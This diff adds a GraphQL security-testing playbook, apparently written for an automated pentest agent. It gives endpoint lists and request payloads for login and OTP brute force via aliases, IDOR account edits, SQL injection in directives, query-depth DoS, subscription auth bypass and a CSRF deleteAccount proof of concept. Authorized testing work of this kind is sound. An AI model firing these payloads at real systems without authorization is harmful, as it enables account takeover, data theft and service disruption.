@@ -1,0 +1,197 @@
+SCOPE: GraphQL API surfaces — enumerate schema, test authorization on every query/mutation, probe batching and complexity limits, and exploit structural weaknesses in resolvers, directives, and subscriptions.
+
+## TARGETS
+
+- Primary GraphQL endpoint: `/graphql`, `/api/graphql`, `/query`, `/v1/graphql`, `/gql`, `/graphql/v1`, `/graphql/v2`
+- Apollo Studio / Sandbox: `https://studio.apollographql.com/sandbox/explorer` (auto-connects to localhost or configured endpoint)
+- Persisted operation endpoints: `GET /graphql?operationId=<hash>` or `POST /graphql` with `{"id":"<hash>"}`
+- Subscription WebSocket: `ws://`, `wss://` same path with `Upgrade: websocket`
+- Schema SDL dump: `/graphql/schema`, `/graphql?sdl`, `/__schema.graphql`
+- Hasura metadata: `/v1/metadata`, `/v1/query`, `/v2/query`, `/api/rest`
+- Apollo Router introspection: `/__apollo_health`, `/__schema`
+
+## TECHNIQUES
+
+1. **Introspection enablement check**
+   Send the standard introspection query. Production APIs often disable it but implement the block inconsistently — bypass with field aliases, alternate casing, fragment spreads, or whitespace mutations.
+
+   ```
+   POST /graphql
+   {"query":"{ __schema { types { name } } }"}
+
+   200 OK — introspection enabled (finding: medium, exposes full schema)
+   {"data":{"__schema":{"types":[...]}}}
+   ```
+
+   Bypass attempts when standard introspection is blocked:
+
+   ```
+   POST /graphql
+   {"query":"{\n  __schema\n  {\n    types {\n      name\n    }\n  }\n}"}
+   ```
+
+   ```
+   POST /graphql
+   {"query":"fragment f on __Schema { types { name } } { ...f }"}
+   ```
+
+   Also probe `__type` on specific type names discovered from error messages or field suggestions:
+
+   ```
+   {"query":"{ __type(name: \"User\") { fields { name type { name ofType { name } } } } }"}
+   ```
+
+2. **Field suggestion leak (schema inference without introspection)**
+   Most GraphQL engines return "Did you mean X?" suggestions when a field name is close to a valid one. This reconstructs the schema without introspection. Send typo queries and harvest suggestions from error messages.
+
+   ```
+   POST /graphql
+   {"query":"{ usr { id } }"}
+
+   {"errors":[{"message":"Cannot query field \"usr\" on type \"Query\". Did you mean \"user\" or \"users\"?"}]}
+   ```
+
+   Automate with Clairvoyance or manual wordlist iteration. Map all discoverable types, fields, arguments, and mutations. Record schema as a finding even if no auth issues exist — schema leaks enable targeted attacks.
+
+3. **Alias-batching to bypass rate limiting and per-request auth checks**
+   GraphQL allows unlimited field aliases in a single request. Send many aliased copies of a rate-limited or brute-forceable operation in one HTTP request to bypass per-request rate limits.
+
+   ```
+   POST /graphql
+   {"query":"{ a1: login(email:\"admin@example.com\",password:\"pass1\") { token } a2: login(email:\"admin@example.com\",password:\"pass2\") { token } a3: login(email:\"admin@example.com\",password:\"pass3\") { token } }"}
+   ```
+
+   For OTP bypass: send 100 aliased OTP verification calls with different codes in one request.
+
+   For auth-check bypass on mutations: if a mutation checks a per-mutation auth flag but batching combines them, the auth of the first alias may carry over to all.
+
+4. **Nested-batching / query complexity DoS**
+   Deeply nested queries or queries with circular references can exhaust server resources. Identify types with self-referential or mutually-referential fields (e.g., `User.posts.author.posts.author...`).
+
+   ```
+   POST /graphql
+   {"query":"{ user(id:1) { friends { friends { friends { friends { friends { id name } } } } } } }"}
+   ```
+
+   Also test array-batch DoS: send an array of operations in one request body (some frameworks support `[{...},{...}]` array syntax):
+
+   ```
+   POST /graphql
+   [{"query":"{ expensiveOperation }"},{"query":"{ expensiveOperation }"},...]
+   ```
+
+   Measure response time increase vs. nesting depth to characterize the vulnerability.
+
+5. **Persisted-operation bypass (send raw query when only hash allowed)**
+   Some APIs enforce Automated Persisted Queries (APQ) or static query whitelisting, expecting only `{"id":"<hash>"}` in production. Test whether the server also accepts raw `query` strings:
+
+   ```
+   POST /graphql
+   {"id":"abc123"}   ← expected by server
+
+   POST /graphql
+   {"query":"{ adminUsers { id email role } }"}   ← raw query bypass attempt
+   ```
+
+   If both return data, the whitelist is not enforced. Also test mixing: `{"id":"abc123","query":"{ malicious { data } }"}` — some servers prefer the `query` field over `id` when both present.
+
+6. **Mutation IDOR**
+   GraphQL mutations often accept IDs as arguments and apply operations to the identified resource. Test whether the authenticated user's ownership of the target resource is verified server-side.
+
+   ```
+   POST /graphql
+   Authorization: Bearer <victim-token>   (attacker's own token, not victim's)
+   {"mutation":"mutation { updateUser(id: \"<victim-uid>\", input: { email: \"attacker@evil.com\" }) { id email } }"}
+   ```
+
+   Systematic IDOR mapping: for every mutation that accepts an ID argument, try an ID that belongs to a different user. Record fields changed to show impact. Also test `deleteX`, `archiveX`, `approveX` mutations.
+
+7. **Subscription authentication weakness**
+   WebSocket-based subscriptions often authenticate at connection time (the `connection_init` message) but may not re-verify auth on individual subscription operations. Test:
+
+   a. Connect without auth, then subscribe to sensitive event streams.
+   b. Connect with a low-privilege token, subscribe to an admin-only subscription.
+   c. Upgrade token mid-session: connect with valid token, invalidate it (logout), observe whether subscription continues to stream events.
+
+   ```
+   # WebSocket handshake
+   GET /graphql
+   Upgrade: websocket
+   Connection: Upgrade
+   Sec-WebSocket-Protocol: graphql-ws
+
+   # After connect, send connection_init without token:
+   {"type":"connection_init","payload":{}}
+
+   # Then subscribe:
+   {"type":"subscribe","id":"1","payload":{"query":"subscription { adminEvents { id action payload } }"}}
+   ```
+
+8. **Directive injection**
+   GraphQL directives (`@deprecated`, `@skip`, `@include`) may have custom implementations. Test for injection in directive arguments: if a directive accepts a string argument that is passed to a resolver or database query, it may be injectable.
+
+   ```
+   POST /graphql
+   {"query":"{ users @deprecated(reason: \"' OR 1=1 -- \") { id } }"}
+   ```
+
+   Also test custom directives discovered via introspection for SQL, command, or template injection in their argument values. Probe `@auth`, `@hasRole`, `@rateLimit` directive argument parsing.
+
+9. **Schema-vs-implementation drift**
+   Introspection describes the intended schema, but resolvers sometimes implement different logic. Test:
+
+   a. Fields marked `@deprecated` may still resolve and return data not shown in the active schema.
+   b. Type names that appear in error messages but not in introspection (shadow types).
+   c. Argument names suggested in errors that are not in introspection (hidden arguments that enable debug modes, admin overrides, etc.).
+
+   ```
+   POST /graphql
+   {"query":"{ user(id: \"1\", _debug: true, _includeDeleted: true) { id deletedAt internalNotes } }"}
+   ```
+
+10. **Apollo Sandbox / Studio exposure**
+    Apollo Sandbox auto-connects to any endpoint URL passed as a query parameter and renders a full IDE if introspection works. If the app's GraphQL endpoint is accessible from the internet and introspection is on, anyone can browse the full schema and run queries via Studio.
+
+    Check: `https://studio.apollographql.com/sandbox/explorer?endpoint=https://api.target.com/graphql`
+
+    Also probe internal Apollo Router health + metrics endpoints:
+
+    ```
+    GET /__apollo_health
+    GET /__schema
+    GET /metrics   (Prometheus metrics may include query names and frequencies)
+    ```
+
+11. **GraphQL over GET (CSRF / SSRF vector)**
+    Some frameworks accept queries via HTTP GET with `?query=...`. This enables CSRF (no preflight for GET) and can be used as an SSRF gadget if the server makes outbound calls based on query arguments.
+
+    ```
+    GET /graphql?query={user(id:"1"){id%20email%20role}}&variables={}
+    ```
+
+    Combine with `<img src="https://api.target.com/graphql?query={deleteAccount}">` for CSRF PoC (only works if mutation is accepted via GET).
+
+12. **Authorization header stripping on batched requests**
+    Some GraphQL gateways strip or fail to forward the Authorization header to subgraph resolvers when processing batched operation arrays. Send a batch where the first operation requires auth and the second targets a different user's data without explicit auth context:
+
+    ```
+    POST /graphql
+    Authorization: Bearer <attacker-token>
+    [
+      {"query":"{ me { id } }"},
+      {"query":"{ user(id: \"<victim-id>\") { privateData } }"}
+    ]
+    ```
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "GraphQL introspection enabled on production", "Alias-batching OTP bypass", "Mutation IDOR on updateUser"
+- `severity`: `critical` (auth bypass or data write to other accounts), `high` (full schema + PII read), `medium` (rate limit bypass, schema inference), `low` (deprecation data leak)
+- `url`: the GraphQL endpoint URL
+- `method`: `POST` (or `GET` if over-GET)
+- `request_body`: the exact GraphQL query/mutation that demonstrated the issue
+- `response_body_excerpt`: the data returned, truncated to 500 bytes, showing the vulnerability
+- `evidence_notes`: describe which resolver or type was affected, what data was exposed, and whether the issue requires authentication
+- `cwe`: CWE-284 for auth bypass; CWE-770 for DoS; CWE-200 for information disclosure; CWE-639 for IDOR
